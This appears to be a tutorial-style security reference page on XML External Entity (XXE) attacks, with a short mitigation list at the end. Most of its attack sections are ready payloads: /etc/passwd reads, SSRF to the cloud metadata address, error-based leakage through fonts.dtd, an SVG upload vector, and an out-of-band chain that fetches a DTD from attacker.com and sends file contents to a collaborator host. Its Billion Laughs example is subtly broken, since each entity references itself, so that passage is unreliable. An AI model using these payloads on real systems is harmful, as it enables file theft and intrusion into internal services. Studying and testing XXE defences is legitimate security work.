---
title: XML External Entity (XXE)
excerpt: XXE attack patterns — context, identification, LFI, SSRF/OOB, error-based, and advanced DTD techniques.
tags: XXE, XML, SSRF, LFI, OOB, DTD, Blind XXE
---

## Context of XXE

Many legacy and modern applications rely on the XML format to consume, store and manage data from several sources. In the past, XML was the most reliable way of processing and storing complex data structures. Nowadays we have other and more efficient ways of processing data such as JSON, but due to the inheritance of XML many products still use it. XML provides some key benefits that support its usage in modern applications:

1. **Flexibility**: XML by design adapts to many different data types and structures since it allows creating custom tags. This is very convenient for managing great amounts of data since you can define an XML Schema Definition (XSD) and a Document Type Definition (DTD) to structure and process the data.

2. **Platform independence**: XML is based on plain text files which allows any operating system to support it. This makes it very convenient for cross-platform solutions in which the data must be accessed from different sources. Additionally, many programming languages support the XML format so the data can be transformed, edited and processed internally by the core of the applications.

3. **Industry Adoption and Standardization**: The World Wide Web Consortium (W3C) has established standards for XML, ensuring consistent implementation and interoperability across different systems and platforms. This industry-wide standardization further enhances its credibility and usability as a preferred choice for data storage interoperability.

---

## What is it

An XML External Entity attack is a type of attack against an application that parses non-validated XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Those external entities are defined by the attacker and can lead to several side effects like data exfiltration or DoS attacks.

**Example of external entity:**

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

In this example the attacker is defining the entity `example`, assigning the value `"Doe"` to it and then reflecting it in the `lastName` element.

---

## Requirements

XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Many XML parsers by default require the developer to limit their capabilities by setting different flags in the component that uses them.

### Famous cases

> *Coming soon.*

---

## Security risks and impacts

The main impact of XXE vulnerabilities is produced on the data stored in the server. XXE is a very common data exfiltration attack vector — not only can it read data stored in the affected server, it can also create connections to other systems and leak data to external sources, leading to internal fingerprinting and giving the attacker information to design more complex chained vectors that may impact other resources in the corporate ecosystem.

### Local File Inclusion (LFI)

XML LFI payloads usually result in the application returning the contents of the requested file.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

In this payload, the entity `xxe` will return the content of `/etc/passwd` since it is referenced below the definition in the element `foo`. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.

### Server-Side Request Forgery (SSRF) / Out-of-Band (OOB)

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability to fingerprint other services running internally.

One variant of this attack leads into OOB attacks when the firewall protection of the affected application is poor. OOB allows the attacker to perform connections to third-party sources (mainly attacker-controlled servers), which allows the delivery of malicious content that can interact with the vulnerable server.

In some cases where direct LFI is not possible, the attacker may use the above techniques to exfiltrate data to a controlled server.

> [Exploiting blind XXE to exfiltrate data out-of-band — PortSwigger](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)

### Resource Exhaustion (DoS)

XML has a feature that allows expanding entities in a recursive way by referencing them in a loop. While this cannot be considered an external entity attack, it is worth mentioning due to the impact it may cause. If the parser is not well configured, those entities will keep being called until the application consumes all its resources.

The most famous resource exhaustion attack is the **Billion Laughs DoS**. While mostly mitigated in modern XML parsers, it provides very useful context on how XML entity expansion works.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE laugh [
  <!ELEMENT laugh ANY>
  <!ENTITY LOL "LOL">
  <!ENTITY LOL1 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
  <!ENTITY LOL2 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
  <!ENTITY LOL3 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
]>
<laugh>&LOL3;</laugh>
```

The above payload makes the XML parser expand each entity, generating a large number of `LOL` strings. A full-scale payload would generate literally _billions_ of `LOL` strings.

### Remote Code Execution (RCE)

In some environments XXE attacks may allow the attacker to perform RCE. By design, XML does not allow directly executing code — most XXE attacks that lead to RCE rely on internal programming language protocols (such as `php://`). This attack vector requires thorough reconnaissance of the affected system to identify compatible tools that may allow this chained attack.

---

## Identifying XXE in REST APIs

The only way to properly identify if an application is vulnerable to XXE is by exploiting it. To minimize the risk of information leakage and server damage, the approach is to either reflect a string from an external entity or read a harmless file like the hosts file.

Some scenarios require further testing since the entry point would not properly reflect the payload in the response. In these cases we can rely on errors returned by the application to identify exploitability.

### Step 1 — Direct entity reflection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

The expected behavior is that the response contains the contents of `/etc/passwd`. If the response does not reflect anything, move on to error-based detection.

### Step 2 — Protocol error triggering

Send a malformed entity to trigger a parser error:

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "sdjsd:///etc/passwd"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

In a real exploitation scenario this payload triggered an `"Unknown protocol: sdjsd"` error — proof that the external entity `xxe` is being processed by the XML parser.

### Step 3 — Malformed URL error

Another method (noisier) is to trigger errors by malforming the resource declaration:

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "http:/AttackerServer"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

The malformed URL caused the target application to return `"protocol = http host = null"`, confirming that the entity got properly resolved.

### Step 4 — Fully blind application

In the most extreme case, the application returns no error information and does not reflect injected entities. Options here:

- Try an OOB connection to a controlled server.
- Analyze behavioral differences: a legitimate request returns `200 OK`, while a well-formed malicious payload that triggers a parser error returns `500`. Use a well-formed XML structure to ensure errors come from the malicious actions, not XML syntax mistakes.

---

## Advanced techniques

- [Data exfiltration through local system DTDs on blind XXE](#data-exfiltration-through-local-system-dtds-on-blind-xxe)
- [OOB LFI using malicious DTDs](#oob-lfi-using-malicious-dtds)

### Data exfiltration through local system DTDs on blind XXE

There are many ways to exfiltrate data using XXE attacks. However, in some cases the most common techniques — such as directly including file contents in the XML response — are not enough to successfully read sensitive files. This often happens when the application's default behavior only prints **error-related information** instead of the actual file content.

For example, if the application returns error messages like:

```json
{
  "errorMessage": "/etc/invalid-file (No such file or directory)"
}
```

```json
{
  "errorMessage": "/etc/shadow (Permission denied)"
}
```

This indicates that the XML parser is attempting to access the specified files and reporting filesystem errors. If we can trigger these errors, we can use them to **enumerate the filesystem** — checking which files exist and which do not.

#### Why enumerate the filesystem?

The goal is to locate **default DTD files** present on the system. These files can be leveraged to perform advanced XXE attacks because they often:

- Define **parameter entities** that can be overridden.
- Allow injecting custom entities to manipulate output and include file contents indirectly.

The core idea:

- Use a **pre-existing DTD** on the system.
- Override its parameter entities to include the contents of a target file.
- Exploit **error-based disclosure** to exfiltrate data without direct file inclusion.

To enumerate the filesystem, use wordlists containing common DTD paths. Once a suitable DTD is found, the attack proceeds by redefining entities and chaining them to exfiltrate data.

#### Example: fonts.dtd

One commonly available DTD is `fonts.dtd`, located at:

```
/usr/share/xml/fontconfig/fonts.dtd
```

This file defines several parameter entities that can be overridden, making it a good candidate for this technique.

**Step 1 — Load the local DTD:**

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %local_dtd;
]>
<message></message>
```

**Step 2 — Override parameter entities:**

`fonts.dtd` defines entities like `%expr` that can be overridden. We redefine them to include malicious logic:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message></message>
```

- `%file` loads the contents of `/etc/passwd`.
- `%eval` creates a new parameter entity `%error` that references a non-existent path concatenated with `%file` content.
- When the parser expands `%error`, it attempts to resolve the invalid path, triggering an error that includes the `/etc/passwd` contents.

**Step 3 — Read the error response:**

```
errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash ..."
```

The file content leaks through the error message.

#### Requirements for robust payloads

| Requirement | Details |
|---|---|
| Valid DTD structure | All markup declarations must appear in proper order. Use a dummy element (e.g. `<!ELEMENT aa (bb'>`) to absorb conflicts. |
| Correct escaping | Use `&#x25;` for `%`, `&#x26;` for `&`, `&#x27;` for quotes when nesting declarations. |
| Expansion order | Override entities → expand `%eval;` and `%error;` → include `%local_dtd;`. Incorrect ordering causes parser rejection. |
| Parameter entities | Always use `%` parameter entities for overriding and chaining. |
| Compatible DTD | The chosen local DTD must allow parameter entity overrides. Common candidates: `fonts.dtd`, `docbook.dtd`, `jspxml.dtd`. |

#### Bonus: internal service enumeration

The same error-based technique can enumerate internal services. Instead of `file:///etc/passwd`, define connections to internal resources (e.g. `http://localhost:8080`) and read responses from the error output.

---

### OOB LFI using malicious DTDs

When the application does not reflect XML entity content in its response, direct file inclusion fails. In these cases, use **out-of-band (OOB) techniques** to force the server to make network requests to an attacker-controlled system. This method does not rely on the application's response, making it effective even when output is suppressed.

**Key concept:** The parser resolves entities. If an entity points to an external resource (HTTP, HTTPS, or FTP), the parser will attempt to fetch it. We exploit this to send data out-of-band.

#### Step 1 — Create a malicious DTD

On the attacker machine, create a DTD file to read `/etc/passwd`:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<collaborator-id>.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- `%file` loads the contents of `/etc/passwd`.
- `%eval` defines `%exfiltrate`, which sends the file contents as a query string to the attacker's server. `&#x25;` is the escaped `%`, required when defining a parameter entity inside another entity.
- `%eval;` expands and defines `%exfiltrate`.
- `%exfiltrate;` triggers the HTTP request.

#### Step 2 — Host the malicious DTD

```bash
python3 -m http.server 80
```

Ensure the server is publicly accessible or reachable from the target environment. Use an IP address instead of a domain name if DNS resolution is unreliable.

#### Step 3 — Send the payload to the application

```xml
<!DOCTYPE message [
  <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
  %remote;
]>
<message>bar</message>
```

`%remote;` expands the content of the malicious DTD, executing the exfiltration logic.

#### Step 4 — Monitor OOB interaction

Use Burp Collaborator or a custom HTTP listener to capture the incoming request. When the parser processes the payload, you should see an HTTP request to your collaborator domain with the contents of `/etc/passwd` in the query string.

#### Requirements

| Requirement | Details |
|---|---|
| External entity resolution | The XML parser must allow fetching external resources via `SYSTEM` identifiers. |
| DOCTYPE injection | The application must accept XML input with `<!DOCTYPE>` declarations. |
| Attacker-controlled server | Needed to host the malicious DTD and capture requests. |
| Parameter entity usage | Use `%` for parameter entities; escape `%` as `&#x25;` when nesting. |
| Network access | The target server must have outbound network access to reach your controlled domain. If egress filtering blocks HTTP, consider DNS exfiltration. |

#### Troubleshooting

- **No OOB hit?** Check if external entity resolution is disabled or if outbound traffic is blocked.
- **Malformed DTD errors?** Verify escaping of `%` and quotes.
- **Long URLs fail?** Use smaller files or encode data (e.g. base64).

---

## Quick reference payloads

| Technique | Payload sketch |
|---|---|
| Basic LFI | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` |
| Blind OOB | External DTD with `%file;` appended to attacker URL |
| Error-based | `SYSTEM "file:///nonexistent/%file;"` in a nested entity |
| PHP filter | `php://filter/convert.base64-encode/resource=/etc/passwd` |

**SVG upload vector:**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## Mitigation

- Disable external entity and DTD processing in the XML parser (consult parser documentation for the specific flag).
- Use `defusedxml` in Python; `FEATURE_DISALLOW_DOCTYPE_DECL` in Java.
- Prefer JSON or other data formats where XML is not strictly required.
- Input validation on file uploads: check magic bytes, not just extension.
